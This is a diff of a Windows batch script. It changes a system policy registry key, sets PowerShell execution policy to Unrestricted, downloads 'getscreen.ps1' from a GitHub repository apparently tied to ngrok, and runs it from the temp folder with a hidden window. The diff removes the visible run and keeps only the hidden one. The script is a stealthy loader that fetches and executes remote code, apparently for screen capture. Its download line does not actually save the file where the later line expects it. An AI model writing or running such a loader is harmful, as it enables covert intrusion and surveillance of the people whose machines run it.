@@ -8,8 +8,6 @@ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Enable
 echo Download and save the Script to the temp folder
 powershell -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser"
 powershell -Command "curl https://raw.githubusercontent.com/d3d0n/funwngrok/main/getscreen.ps1"
-echo Run the Script
-powershell -Command "& $env:temp\getscreen.ps1"
 echo Run the Script Without Powershell Window
 powershell -Command "& $env:temp\getscreen.ps1 -WindowStyle Hidden"
 echo Done!
